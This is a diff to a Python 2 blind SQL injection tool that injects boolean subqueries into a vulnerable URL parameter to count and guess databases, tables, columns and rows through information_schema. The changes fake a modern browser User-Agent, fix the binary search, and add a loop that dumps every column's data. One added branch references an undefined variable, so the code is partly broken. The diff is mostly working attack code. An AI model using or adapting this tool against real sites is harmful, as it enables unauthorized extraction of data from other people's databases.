@@ -12,12 +12,12 @@ from urlparse import urlparse, parse_qsl
 class Blind():
     '盲注基础类'
     headers = {
-      'User-Agent' : 'Mozilla/4.0 (compatible;MSIE 5.5 ; Windows NT',
-      'Accept-Language' : 'en-us',
-      'Accept-Encoding' : 'text/html;q=0.9',
-      'Keep-Alive' : '300',
-      'Connection' : 'keep-alive',
-      'Cache-Control': 'max-age=0',  
+       'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
+       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+       'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
+       'Accept-Encoding': 'none',
+       'Accept-Language': 'en-US,en;q=0.8',
+       'Connection': 'keep-alive',  
     }
 
     def __init__(self,url,good_string, data=None, vulnerable_param=None, cookie='', timeout=0, method='GET',dbms='mysql'):
@@ -95,7 +95,8 @@ class Blind():
     def count_params(self, operator, number, table):
         '得到所要查的东西有多少库、表、列'
         params = dict(self.params)
-        params[self.vulnerable_param] += '\' and {0} {1} (select count(*) from {2}) -- '.format(number,operator,table)
+        if injectiontype == 'Bool':
+            params[self.vulnerable_param] += '\' and {0} {1} (select count(*) from {2}) -- '.format(number,operator,table)
         return params
 
     def length_params(self, operator,number, field, table, offset):
@@ -132,7 +133,7 @@ class Blind():
         first = last / 2
         while first < last:
             middle = (first + last ) / 2
-            params = self.count_params('<',last,table)
+            params = self.count_params('<',middle,table)
             if self.make_request(params):
                 first = middle + 1
             else:
@@ -247,6 +248,7 @@ class Blind():
                 fields = self.concat(fields)
                 print fields
             count = self.guess_count(table)
+            #print 'test:',table
             print '\r[+] Rows: ' + str(count) + '         '
             results = []
             for i in range(start, count):
@@ -290,4 +292,7 @@ if __name__ == "__main__":
     for i in tables:
         column_where = table_where+' and table_name= \''+i+'\''
         columns =  test.query('column_name','information_schema.columns',column_where)
-        print 'database -> ',database,'\rtable -> ',i,'\rcolumns: -> ',columns
+        print 'database -> ',database,'\ntable -> ',i,'\ncolumns: -> ',columns
+        for j in columns:
+            data = test.query(j,i)
+            print 'database -> ',database,'\ntable -> ',i,'\ncolumns: -> ',j,'\n data -> ',data
